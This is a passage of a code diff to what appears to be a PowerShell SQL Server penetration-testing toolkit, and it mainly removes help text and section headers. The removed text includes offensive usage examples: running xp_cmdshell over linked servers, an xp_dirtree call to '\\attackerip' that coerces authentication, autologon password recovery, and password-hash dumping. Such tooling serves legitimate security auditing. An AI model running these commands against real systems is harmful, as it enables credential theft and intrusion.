-    Crawl linked servers and return a list of databases for each one as datatable objects.
-    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases"
-    .Example
-    Crawl linked servers and return a list of databases for each one. and hide broken links.
-    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" | where name -ne "Broken Link" | select name,version,path,links,user,sysadmin,customquery | format-table
-    .Example
-    Crawl linked servers, execute an OS command using xp_cmdshell, and return the results.
-    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell 'whoami'" | format-table
-    .Example
-    Crawl linked servers, execute xp_dirtree, and return results.  This can also be used to force the SQL Server to authenticate to an attacker using a UNC path.
-    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree 'c:\temp'" -Export | format-table
-    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree '\\attackerip\file'" -Export | format-table
-    .Example
-     Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
-    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" -Export | where name -ne "broken link" | sort name |  Format-Table
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -12362,25 +10431,9 @@ Function Get-SQLServerLinkQuery{
     }
 }
 
-
-# ----------------------------------
-#  Test-FolderWriteAccess
-# ----------------------------------
-
 Function Test-FolderWriteAccess
 {
-    <#
-            .SYNOPSIS
-            Check if the current user has write access to a provided directory by creating a temp file and removing it.
-            .PARAMETER OutFolder
-            Output directory path.
-            .EXAMPLE
-            PS C:\> Test-FolderWriteAccess "c:\windows\system32"
-            False 
-            .EXAMPLE
-            PS C:\> Test-FolderWriteAccess "$env:LOCALAPPDATA"
-            True
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -12405,62 +10458,10 @@ Function Test-FolderWriteAccess
         }
     }
 }
-#endregion
 
-#########################################################################
-#
-#region          DISCOVERY FUNCTIONS
-#
-#########################################################################
-
-# -------------------------------------------
-# Function: Get-DomainSpn
-# -------------------------------------------
-
-# Reference: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
 function Get-DomainSpn
 {
-    <#
-            .SYNOPSIS
-            Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
-            Note: This will use the default logon server by default.
-            .PARAMETER Username
-            Domain account to authenticate to Active Directory.
-            .PARAMETER Password
-            Domain password to authenticate to Active Directory.
-            .PARAMETER Credential
-            Domain credential to authenticate to Active Directory.
-            .PARAMETER DomainController
-            Domain controller to authenticated to. Requires username/password or credential.
-            .PARAMETER ComputerName
-            Computer name to filter for.
-            .PARAMETER DomainAccount
-            Domain account to filter for.
-            .PARAMETER SpnService
-            SPN service code to filter for.
-            .EXAMPLE
-            PS C:\temp> Get-DomainSpn -SpnService MSSQL | Select-Object -First 2
-
-            UserSid      : 15000005210002431346712321821222048886811922073100
-            User         : SQLServer1$
-            UserCn       : SQLServer1
-            Service      : MSSQLSvc
-            ComputerName : SQLServer1.domain.local
-            Spn          : MSSQLSvc/SQLServer1.domain.local:1433
-            LastLogon    : 6/24/2016 6:56 AM
-            Description  : This is a SQL Server test instance using a local managed service account.
-
-            UserSid      : 15000005210002431346712321821222048886811922073101
-            User         : SQLServiceAccount
-            UserCn       : SQLServiceAccount
-            Service      : MSSQLSvc
-            ComputerName : SQLServer2.domain.local
-            Spn          : MSSQLSvc/SQLServer2.domain.local:NamedInstance
-            LastLogon    : 3/26/2016 3:43 PM
-            Description  : This is a SQL Server test instance using a domain service account.
-            .EXAMPLE
-            PS C:\temp> Get-DomainSpn -DomainController 10.0.0.1  -Username Domain\User -Password Password123!
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -12608,44 +10609,9 @@ function Get-DomainSpn
 }
 
 
-# -------------------------------------------
-# Function: Get-DomainObject
-# -------------------------------------------
-# Author: Will Schroeder
-# Modifications: Scott Sutherland
 function Get-DomainObject
 {
-    <#
-            .SYNOPSIS
-            Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
-            Note: This will use the default logon server by default.
-            .PARAMETER Username
-            Domain account to authenticate to Active Directory.
-            .PARAMETER Password
-            Domain password to authenticate to Active Directory.
-            .PARAMETER Credential
-            Domain credential to authenticate to Active Directory.
-            .PARAMETER DomainController
-            Domain controller to authenticated to. Requires username/password or credential.
-            .PARAMETER LdapFilter
-            LDAP filter.
-            .PARAMETER LdapPath
-            Ldap path.
-            .PARAMETER $Limit
-            Maximum number of Objects to pull from AD, limit is 1,000.".
-            .PARAMETER SearchScope
-            Scope of a search as either a base, one-level, or subtree search, default is subtree..
-            .EXAMPLE
-            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))"
-            .EXAMPLE
-            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1:389
-            It will use the security context of the current process to authenticate to the domain controller.
-            IP:Port can be specified to reach a pivot machine.
-            .EXAMPLE
-            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!
-            .Notes
-            This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -12771,90 +10737,9 @@ function Get-DomainObject
     }
 }
 
-# -------------------------------------------
-# Function:  Get-SQLInstanceDomain
-# -------------------------------------------
-
 Function  Get-SQLInstanceDomain
 {
-    <#
-            .SYNOPSIS
-            Returns a list of SQL Server instances discovered by querying a domain controller for systems with registered MSSQL service principal names.
-            The function will default to the current user's domain and logon server, but an alternative domain controller can be provided.
-            UDP scanning of management servers is optional.
-            .PARAMETER Username
-            Domain user to authenticate with domain\user.
-            .PARAMETER Password
-            Domain password to authenticate with domain\user.
-            .PARAMETER Credential
-            Credentials to use when connecting to a Domain Controller.
-            .PARAMETER DomainController
-            Domain controller for Domain and Site that you want to query against.  Only used when username/password or credential is provided.
-            .PARAMETER ComputerName
-            Domain computer name to filter for.
-            .PARAMETER DomainAccount
-            Domain account to filter for.
-            .PARAMETER CheckMgmt
-            Performs UDP scan of servers with registered MSServerClusterMgmtAPI SPNs to help find additional SQL Server instances.
-            .PARAMETER UDPTimeOut
-            Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose
-            VERBOSE: Grabbing SQL Server SPNs from domain...
-            VERBOSE: Getting domain SPNs...
-            VERBOSE: Parsing SQL Server instances from SPNs...
-            VERBOSE: 35 instances were found.
-
-            ComputerName     : SQLServer1.domain.com
-            Instance         : SQLServer1.domain.com
-            DomainAccountSid : 1500000521000123456712921821222049996811922123456
-            DomainAccount    : SQLServer1$
-            DomainAccountCn  : SQLServer1
-            Service          : MSSQLSvc
-            Spn              : MSSQLSvc/SQLServer1.domain.com
-            LastLogon        : 6/22/2016 9:00 AM
-            [TRUNCATED]
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose -CheckMgmt
-            PS C:\> Get-SQLInstanceDomain -Verbose
-            VERBOSE: Grabbing SQL Server SPNs from domain...
-            VERBOSE: Getting domain SPNs...
-            VERBOSE: Parsing SQL Server instances from SPNs...
-            VERBOSE: 35 instances were found.
-            VERBOSE: Getting domain SPNs...
-            VERBOSE: 10 SPNs found on servers that matched search criteria.
-            VERBOSE: Performing a UDP scan of management servers to obtain managed SQL Server instances...
-            VERBOSE:  - MServer1.domain.com - UDP Scan Start.
-            VERBOSE:  - MServer1.domain.com - UDP Scan Complete.
-
-            ComputerName     : SQLServer1.domain.com
-            Instance         : SQLServer1.domain.com
-            DomainAccountSid : 1500000521000123456712921821222049996811922123456
-            DomainAccount    : SQLServer1$
-            DomainAccountCn  : SQLServer1
-            Service          : MSSQLSvc
-            Spn              : MSSQLSvc/SQLServer1.domain.com
-            LastLogon        : 6/22/2016 9:00 AM
-            [TRUNCATED]
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -DomainController 10.10.10.1 -Username domain\user -Password SecretPassword123!
-            VERBOSE: Grabbing SQL Server SPNs from domain...
-            VERBOSE: Getting domain SPNs...
-            VERBOSE: Parsing SQL Server instances from SPNs...
-            VERBOSE: 35 instances were found.
-
-            ComputerName     : SQLServer1.domain.com
-            Instance         : SQLServer1.domain.com
-            DomainAccountSid : 1500000521000123456712921821222049996811922123456
-            DomainAccount    : SQLServer1$
-            DomainAccountCn  : SQLServer1
-            Service          : MSSQLSvc
-            Spn              : MSSQLSvc/SQLServer1.domain.com
-            LastLogon        : 6/22/2016 9:00 AM
-            [TRUNCATED]
-
-
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -13029,44 +10914,9 @@ Function  Get-SQLInstanceDomain
     }
 }
 
-
-# -------------------------------------------
-# Function:  Get-SQLInstanceLocal
-# -------------------------------------------
-
 Function  Get-SQLInstanceLocal
 {
-    <#
-            .SYNOPSIS
-            Returns a list of the SQL Server instances found in the Windows registry for the local system.
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal
-
-            ComputerName       : Computer1
-            Instance           : Computer1\SQLEXPRESS
-            ServiceDisplayName : SQL Server (SQLEXPRESS)
-            ServiceName        : MSSQL$SQLEXPRESS
-            ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS
-            ServiceAccount     : NT Service\MSSQL$SQLEXPRESS
-            State              : Running
-
-            ComputerName       : Computer1
-            Instance           : Computer1\STANDARDDEV2014
-            ServiceDisplayName : SQL Server (STANDARDDEV2014)
-            ServiceName        : MSSQL$STANDARDDEV2014
-            ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\Binn\sqlservr.exe" -sSTANDARDDEV2014
-            ServiceAccount     : LocalSystem
-            State              : Running
-
-            ComputerName       : Computer1
-            Instance           : Computer1
-            ServiceDisplayName : SQL Server (MSSQLSERVER)
-            ServiceName        : MSSQLSERVER
-            ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
-            ServiceAccount     : NT Service\MSSQLSERVER
-            State              : Running
-
-    #>
+   
     Begin
     {
         # Table for output
@@ -13132,63 +10982,9 @@ Function  Get-SQLInstanceLocal
 }
 
 
-# ----------------------------------
-#  Get-SQLInstanceScanUDP
-# ----------------------------------
-# Author: Eric Gruber
-# Note: Pipeline and timeout mods by Scott Sutherland
 function Get-SQLInstanceScanUDP
 {
-    <#
-            .SYNOPSIS
-            Returns a list of SQL Servers resulting from a UDP discovery scan of provided computers.
-            .PARAMETER ComputerName
-            Computer name or IP address to enumerate SQL Instance from.
-            .PARAMETER UDPTimeOut
-            Timeout in seconds. Longer timeout = more accurate.
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceScanUDP -Verbose -ComputerName SQLServer1.domain.com
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Express
-            InstanceName : Express
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51663
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Standard
-            InstanceName : Standard
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51861
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLInstanceScanUDP -Verbose
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.
-
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Express
-            InstanceName : Express
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51663
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Standard
-            InstanceName : Standard
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51861
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-            [TRUNCATED]
-    #>
+    
     [CmdletBinding()]
     param(
 
@@ -13314,35 +11110,9 @@ function Get-SQLInstanceScanUDP
 }
 
 
-# -------------------------------------------
-# Function:  Get-SQLInstanceBroadcast
-# -------------------------------------------
-
-# Initial publication by @nikhil_mitt on twitter
 function Get-SQLInstanceBroadcast 
 {
-    <#
-            .SYNOPSIS
-            This function sends a UDP request to the broadcast address of the current subnet using the 
-            SMB protocol over port 138 to identify SQL Server instances on the local network.  The .net function used
-            has been supported since .net version 2.0. For more information see the reference below:
-            https://msdn.microsoft.com/en-us/library/system.data.sql.sqldatasourceenumerator(v=vs.110).aspx
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceBroadcast -Verbose
-            VERBOSE: Attempting to identify SQL Server instances on the broadcast domain.
-            VERBOSE: 7 SQL Server instances were found.
-
-            ComputerName                         Instance                            IsClustered                         Version                            
-            ------------                         --------                            -----------                         -------                            
-            MSSQLSRV01                           MSSQLSRV01\SQLSERVER2012            No                                  11.0.2100.60
-            MSSQL2K5                             MSSQL2K5                            No                                  9.00.1399.06
-            MSSQLSRV03                           MSSQLSRV03\SQLSERVER2008            No                                  10.0.1600.22
-            MSSQLSRV04                           MSSQLSRV04\SQLSERVER2014            No                                  12.0.4100.1
-            MSSQLSRV04                           MSSQLSRV04\SQLSERVER2016            No                                  13.0.1601.5
-            MSSQLSRV04                           MSSQLSRV04\BOSCHSQL                 No                                  12.0.4100.1
-            MSSQLSRV04                           MSSQLSRV04\SQLSERVER2017            No                                  14.0.500.272
-    #>
-
+   
     [CmdletBinding()]
     Param(
             [Parameter(Mandatory = $false,
@@ -13419,67 +11189,9 @@ function Get-SQLInstanceBroadcast
 }
 
 
-# ----------------------------------
-#  Get-SQLInstanceScanUDPThreaded
-# ----------------------------------
-# Author: Eric Gruber
-# Note: Pipeline and timeout mods by Scott Sutherland
 function Get-SQLInstanceScanUDPThreaded
 {
-    <#
-            .SYNOPSIS
-            Returns a list of SQL Servers resulting from a UDP discovery scan of provided computers.
-            .PARAMETER ComputerName
-            Computer name or IP address to enumerate SQL Instance from.
-            .PARAMETER UDPTimeOut
-            Timeout in seconds. Longer timeout = more accurate.
-            .PARAMETER Threads
-            Number of concurrent host threads.
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1.domain.com
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Express
-            InstanceName : Express
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51663
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Standard
-            InstanceName : Standard
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51861
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLInstanceScanUDP -Verbose -Threads 20
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
-            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.
-
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Express
-            InstanceName : Express
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51663
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-
-            ComputerName : SQLServer1.domain.com
-            Instance     : SQLServer1.domain.com\Standard
-            InstanceName : Standard
-            ServerIP     : 10.10.10.30
-            TCPPort      : 51861
-            BaseVersion  : 11.0.2100.60
-            IsClustered  : No
-            [TRUNCATED]
-    #>
-
-    [CmdletBinding()]
+   [CmdletBinding()]
     param(
 
         [Parameter(Mandatory = $true,
@@ -13632,10 +11344,6 @@ function Get-SQLInstanceScanUDPThreaded
     }
 }
 
-# ----------------------------------
-#  Get-SQLInstanceFile
-# ----------------------------------
-
 Function  Get-SQLInstanceFile
 {
     <#
@@ -13718,71 +11426,10 @@ Function  Get-SQLInstanceFile
         $TblFileInstances
     }
 }
-#endregion
-
-#########################################################################
-#
-#region          PASSWORD RECOVERY FUNCTIONS
-#
-#########################################################################
-
-# ----------------------------------
-#  Get-SQLRecoverPwAutoLogon
-# ----------------------------------
 
 Function   Get-SQLRecoverPwAutoLogon
 {
-    <#
-            .SYNOPSIS
-            Returns the Windows auto login credentials through SQL Server using xp_regread. 
-            This requires sysadmin privileges.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .Example
-            PS C:\> Get-SQLInstanceLocal |  Get-SQLRecoverPwAutoLogon -Verbose
-            VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
-            VERBOSE: SQLServer1 : Connection Success.
-
-
-            ComputerName : SQLServer1
-            Instance     : SQLServer1\SQLEXPRESS
-            Domain       : Demo
-            UserName     : KioskAdmin
-            Password     : KioskPassword!
-
-            ComputerName : SQLServer1
-            Instance     : SQLServer1\SQLEXPRESS
-            Domain       : Demo
-            UserName     : kioskuser
-            Password     : KioskUserPassword!
-
-            .Example
-            PS C:\> Get-SQLRecoverPwAutoLogon -Verbose -instance SQLServer1\STANDARDDEV2014
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
-
-
-            ComputerName : SQLServer1
-            Instance     : SQLServer1\STANDARDDEV2014
-            Domain       : localhost
-            UserName     : KioskAdmin
-            Password     : KioskPassword!
-
-            ComputerName : SQLServer1
-            Instance     : SQLServer1\STANDARDDEV2014
-            Domain       : localhost2
-            UserName     : kioskuser
-            Password     : KioskUserPassword!
-
-            .Notes
-            https://support.microsoft.com/en-us/kb/321185
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -13968,67 +11615,9 @@ Function   Get-SQLRecoverPwAutoLogon
 }
 
 
-# ----------------------------------
-# Get-SQLServerPolicy
-# ----------------------------------
-
 Function Get-SQLServerPolicy
 {
-    <#
-            .SYNOPSIS
-            Returns policy information related to policy based management.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .EXAMPLE
-            PS C:\>Get-SQLServerPolicy -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName        : SQLServer1
-            Instance            : SQLServer1\STANDARDDEV2014
-            policy_id           : 17
-            PolicyName          : WatchAllTheThings
-            condition_id        : 18
-            ConditionName       : DatCheck
-            facet               : Login
-            ConditionExpression : <Operator>
-                                    <TypeClass>Bool</TypeClass>
-                                    <OpType>EQ</OpType>
-                                    <Count>2</Count>
-                                    <Attribute>
-                                      <TypeClass>DateTime</TypeClass>
-                                      <Name>DateLastModified</Name>
-                                    </Attribute>
-                                    <Function>
-                                      <TypeClass>DateTime</TypeClass>
-                                      <FunctionType>DateTime</FunctionType>
-                                      <ReturnType>DateTime</ReturnType>
-                                      <Count>1</Count>
-                                      <Constant>
-                                        <TypeClass>String</TypeClass>
-                                        <ObjType>System.String</ObjType>
-                                        <Value>2017-09-14T00:00:00.0000000</Value>
-                                      </Constant>
-                                    </Function>
-                                  </Operator>
-            root_condition_id   : 
-            is_enabled          : False
-            date_created        : 9/14/2017 9:01:11 PM
-            date_modified       : 
-            description         : Watch all the things.
-            created_by          : sa
-            is_system           : False
-            target_set_id       : 17
-            TYPE                : LOGIN
-            type_skeleton       : Server/Login
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal |Get-SQLServerPolicy -Verbose
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -14142,42 +11731,9 @@ Function Get-SQLServerPolicy
 }
 
 
-# ----------------------------------
-#  Get-SQLServerPasswordHash
-# ----------------------------------
-# Author: Mike Manzotti (@mmanzo_)
 Function  Get-SQLServerPasswordHash
 {
-    <#
-            .SYNOPSIS
-            Returns logins from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER PrincipalName
-            Pincipal name to filter for.
-			.PARAMETER
-			Migrate to SQL Server process.
-            .EXAMPLE
-            PS C:\> Get-SQLServerPasswordHash -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
-
-			ComputerName        : SQLServer1
-			Instance            : SQLServer1\STANDARDDEV2014
-			PrincipalId         : 1
-			PrincipalName       : sa
-			PrincipalSid        : 7F883D1B...
-			PrincipalType       : SQL_LOGIN
-			CreateDate          : 19/03/2017 08:16:57
-			DefaultDatabaseName : master
-			PasswordHash        : 0x0200c8...
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLServerPasswordHash -Verbose
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -14465,50 +12021,9 @@ Function  Get-SQLServerPasswordHash
     }
 }
 
-#endregion
-
-
-
-# ---------------------------------------
-# Invoke-SQLAuditSQLiSpExecuteAs
-# ---------------------------------------
-
 Function Invoke-SQLAuditSQLiSpExecuteAs
 {
-    <#
-            .SYNOPSIS
-            This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
-            There is also an options to check for 
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditSQLiSpExecuteAs -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Potential SQL Injection
-            Description   : The affected procedure is using dynamic SQL and the "EXECUTE AS OWNER" clause.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.
-            server.
-            Remediation   : Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance SQLServer1\STANDARDDEV2014 -Keyword "EXECUTE AS OWNER" 
-            Details       : The testdb.dbo.sp_vulnerable stored procedure is affected.
-            Reference     : https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditSQLiSpExecuteAs -Verbose
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -14658,47 +12173,9 @@ Function Invoke-SQLAuditSQLiSpExecuteAs
     }
 }
 
-
-# ---------------------------------------
-# Invoke-SQLAuditSQLiSpSigned
-# ---------------------------------------
-
 Function Invoke-SQLAuditSQLiSpSigned
 {
-    <#
-            .SYNOPSIS
-            This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
-            There is also an options to check for 
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditSQLiSpSigned -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Potential SQL Injection
-            Description   : The affected procedure is using dynamic SQL and is signed.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.
-            server.
-            Remediation   : Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance SQLServer1\STANDARDDEV2014 -Keyword "EXECUTE AS OWNER" 
-            Details       : The testdb.dbo.sp_vulnerable stored procedure is affected.
-            Reference     : https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditSQLiSpSigned -Verbose
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -14827,9 +12304,7 @@ Function Invoke-SQLAuditSQLiSpSigned
             }
         }    
 
-        # ------------------------------------------------------------------
-        # Exploit Vulnerability
-        # ------------------------------------------------------------------
+
         if($Exploit){
             Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
         }
@@ -14849,45 +12324,11 @@ Function Invoke-SQLAuditSQLiSpSigned
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditPrivServerLink
-# ---------------------------------------
+
 
 Function Invoke-SQLAuditPrivServerLink
 {
-    <#
-            .SYNOPSIS
-            Check if any SQL Server links are configured with remote credentials.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivServerLink -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Excessive Privilege - Linked Server
-            Description   : One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote
-            server.
-            Remediation   : Configure SQL Server links to connect to remote servers using the login's current security context.
-            Severity      : Medium
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : Example query: SELECT * FROM OPENQUERY([Server01\SQLEXPRESS],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')
-            Details       : The SQL Server link Server01\SQLEXPRESS was found configured with the test login.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms190479.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivServerLink -Verbose
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -15061,47 +12502,9 @@ Function Invoke-SQLAuditPrivServerLink
     }
 }
 
-
-# ---------------------------------------
-# Invoke-SQLAuditDefaultLoginPw
-# ---------------------------------------
-
-# Reference: https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md
 Function  Invoke-SQLAuditDefaultLoginPw
 {
-    <#
-            .SYNOPSIS
-            Based on the instance name, test if SQL Server is configured with default passwords.
-            There is also an options to check for 
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditDefaultLoginPw -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Default SQL Server Login Password
-            Description   : The target SQL Server instance is configured with a default SQL login and password.
-            Remediation   : Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : Get-SQLQuery -Verbose -Instance SQLServer1\STANDARDDEV2014 -Q "Select @@Version" -Username test -Password test. 
-            Details       : Affected credentials: test/test.
-            Reference     : https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw -Verbose
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -15225,48 +12628,9 @@ Function  Invoke-SQLAuditDefaultLoginPw
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditPrivTrustworthy
-# ---------------------------------------
-
 Function Invoke-SQLAuditPrivTrustworthy
 {
-    <#
-            .SYNOPSIS
-            Check if any databases have been configured as trustworthy.
-            .PARAMETER Username
